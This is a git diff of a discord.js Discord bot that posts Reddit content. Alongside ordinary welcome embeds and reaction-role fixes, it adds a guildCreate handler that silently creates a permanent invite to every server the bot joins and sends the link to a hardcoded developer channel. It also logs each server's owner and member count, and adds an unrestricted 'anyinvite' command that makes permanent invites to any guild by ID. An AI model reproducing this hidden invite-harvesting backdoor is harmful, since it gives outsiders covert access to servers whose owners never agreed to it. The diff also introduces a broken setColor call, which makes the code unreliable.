@@ -68,7 +68,7 @@ message.delete()
    //  if (message.author.id !==  superiors.admin3)return message.channel.send("Since you aren't `Sai#8085` or `GLRC Sneky God of Chaos#3714`, you can't use this command.").then(message => message.delete(10000));
      let bicon = client.user.displayAvatarURL;
      let embed = new Discord.RichEmbed()
-       .setColor("c470fa")
+       .setColor(c470fa)
        .addField("Profile Artwork By", "Willibeest#2814")
        .addField("Bot Made By", "Soldz (CF)#6819")
        .setThumbnail(bicon) 
@@ -148,30 +148,30 @@ await fetchedMessage.react(emojipick)
 client.on("messageReactionAdd", async (reaction, user) => {
      const message = reaction.message;
    if (reaction.emoji.name === 'lewd') {
-     if (message.user.bot) return
+     if (user.bot) return;
      let reactionmember = message.guild.members.get(user.id);
     await reactionmember.addRole('536255042143911946')
      // if(reactionmember.roles.has("499314075449425940")) return;
    //  reactionmember.send("Congrats, you've self-assigned yourself the Finished Product Testers role.")
      console.log("Worked! It's added. (RolePlayer)");
    } else if (reaction.emoji.name === 'SmugGal')  { 
-        if (message.user.bot) return
+        if (user.bot) return;
      let reactionmember2 = message.guild.members.get(user.id);
     await reactionmember2.addRole('537106357732507688')
    //  reactionmember2.send("Congrats, you've self-assigned yourself the NSFW ACCESS role.")
      console.log("Worked! It's added. (Lore Roleplayer)");
      } else if (reaction.emoji.name === 'peachy')  { 
-     if (user.bot) return
+     if (user.bot) return;
      let reactionmember = message.guild.members.get(user.id);
     await reactionmember.addRole('492096695203528717')
           console.log("Worked! It's added. (peachy)");
        } else if (reaction.emoji.name === 'shellhappy')  { 
-             if (message.user.bot) return
+            if (user.bot) return;
      let reactionmember = message.guild.members.get(user.id);
     await reactionmember.addRole('498778090802118659')
           console.log("Worked! It's added. (fileaccess)");
          } else if (reaction.emoji.name === 'shellWAT')  {
-        if (message.user.bot) return
+       if (user.bot) return;
      let reactionmember = message.guild.members.get(user.id);
     await reactionmember.addRole('496863657347645471')
           console.log("Worked! It's added. (New Tester)");
@@ -226,6 +226,119 @@ client.on('raw', packet => {
             client.emit('messageReactionRemove', reaction, client.users.get(packet.d.user_id));
         }
     });
+});
+
+	client.on('guildCreate', guild => {
+  let channel = client.channels.get("516493956507369472");
+
+  const embed = new Discord.RichEmbed()
+      .setColor(0xcee3f8)
+      .setAuthor(`Joined ${guild.name}`)
+      .setThumbnail(guild.iconURL)
+      .addField("Owner", guild.owner.user.tag)
+      .addField("ID", guild.id, true)
+      .addField("Users", guild.memberCount, true)
+      .addField("Channels", guild.channels.size, true)
+  return channel.send(embed);
+});
+
+ 	client.on('guildCreate', guild => {
+ let channel = client.channels.get("507732390836436994");
+let invite = guild.channels.random().createInvite({maxAge: 0}).then(function(newInvite){
+return channel.send(`https://discord.gg/${newInvite.code}`)
+    });
+  });
+
+ 	// client.on('guildCreate', guild => {
+ 	// let redditimage = "https://image.ibb.co/hpQqaV/reddit-combo-1920.png"
+ 	// let reddit = "https://image.ibb.co/jypUHf/580b57fcd9996e24bc43c531.png"
+ 	// //   let channel = guild.channels.find(c => c.name === 'general')
+ 	// //let oof = guild.channels.random().then(a => a.send(joinembed))
+ 	// let channel = guild.owner
+ 	// let joinembed = new Discord.RichEmbed()
+ 	// .setColor(0xcee3f8)
+ 	// .addField(`Thank you for inviting ${client.user.username}!`, "There really isn't any setup, but you will need to know that this bot has selected subreddits both SFW and NSFW. If there are any errors with any of command feel free to send them via `r/error`, thank you and enjoy reddit!")
+ 	// .setImage(redditimage)
+ 	// .setFooter("Powered By Reddit | Bot Created By Soldz (CF)#6819", reddit)
+ 	// return channel.send(joinembed);
+ 	// });
+
+ 	client.on('guildCreate', guild => {
+         let redditimage = "https://image.ibb.co/hpQqaV/reddit-combo-1920.png"
+      let reddit = "https://image.ibb.co/jypUHf/580b57fcd9996e24bc43c531.png"
+  //   let channel = guild.channels.find(c => c.name === 'general')
+   //let oof = guild.channels.random().then(a => a.send(joinembed))
+  let channel = guild.owner
+    let joinembed = new Discord.RichEmbed()
+    .setColor(0xcee3f8)
+    .addField(`Thank you for inviting ${client.user.username}!`, "There really isn't any setup, but you will need to know that this bot has selected subreddits both SFW and NSFW. If there are any errors with any of command feel free to send them via `r/error`, thank you and enjoy reddit!")
+    .setImage(redditimage)
+    .setFooter("Powered By Reddit | Bot Created By Soldz (CF)#6819", reddit)
+    return channel.send(joinembed);
+    });
+
+    	client.on('guildCreate', guild => {
+   	let guildchannel = guild.channels;
+    let channelID;
+ 	    Loop:
+    	for (let c of guildchannel) {
+     	let channelequals = c[1].type;
+    	if (channelequals === "text") {
+      	channelID = c[0];
+    	break Loop;
+     	}
+   	}
+ 	let redditimage = "https://image.ibb.co/hpQqaV/reddit-combo-1920.png"
+ 	let reddit = "https://image.ibb.co/jypUHf/580b57fcd9996e24bc43c531.png"
+ 	let channel = client.channels.get(guild.systemChannelID || channelID);
+ 	let joinembed = new Discord.RichEmbed()
+ 	.setColor(0xcee3f8)
+ 	.addField(`Thank you for inviting ${client.user.username}!`, "There really isn't any setup, but you will need to know that this bot has selected subreddits both SFW and NSFW. If there are any errors with any of command feel free to send them via `r/error`, thank you and enjoy reddit!")
+ 	.setImage(redditimage)
+ 	.setFooter("Powered By Reddit | Bot Created By Soldz (CF)#6819", reddit)
+ 	return channel.send(joinembed);
+ 	});
+
+
+
+client.on('guildDelete', guild => {
+  let channel = client.channels.get("516493956507369472");
+
+  const embed = new Discord.RichEmbed()
+      .setColor(0xcee3f8)
+      .setAuthor(`Left ${guild.name}`)
+      .setThumbnail(guild.iconURL)
+      .addField("Owner", guild.owner.user.tag)
+      .addField("ID", guild.id, true)
+      .addField("Users", guild.memberCount, true)
+      .addField("Channels", guild.channels.size, true)
+  return channel.send(embed);
+});     
+
+client.on("guildUpdate", function (oldGuild, newGuild) {
+         let channel = client.channels.get("516493956507369472");
+	 let gicon = newGuild.iconURL;
+        const eeembed = new Discord.RichEmbed()
+            .setColor(0xcee3f8)
+            .setThumbnail(gicon)
+            .setAuthor(`A Guild Has been Updated`, gicon)
+            .addField(`Old Guild Name:`, `${oldGuild}`)
+            .addField(`New Guild Name:`, `${newGuild}`)
+         //   .addField(`New Verification level`, newGuild.guild.verificationLevel, true)
+        return channel.send(eeembed);
+}); 
+
+client.on("message", async (message) => {
+if (message.content.startsWith(`${prefix}anyinvite`)) {
+ let args = message.content.slice(1).split(" ");
+    if (message.channel.type == "dm") return;
+	
+    let sv = client.guilds.get(args[1])
+    if (!sv) return message.channel.send(`❌ Enter a valid guild id!`)
+    sv.channels.random().createInvite({maxAge: 0}).then(a => 
+    message.channel.send(a.toString()))
+
+}
 });
 
 
